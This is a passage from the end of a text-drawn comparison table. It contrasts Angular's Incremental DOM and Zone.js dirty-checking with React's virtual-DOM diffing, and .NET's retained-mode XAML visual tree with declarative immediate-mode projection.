├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ Angular Parallel           │ Incremental DOM / Zone.js dirty-checking vs React V-DOM diffing   │
├────────────────────────────┼───────────────────────────────────────────────────────────────────┤
│ .NET Parallel              │ Retained-mode XAML visual tree vs Declarative Immediate projection│
└────────────────────────────┴───────────────────────────────────────────────────────────────────┘
```
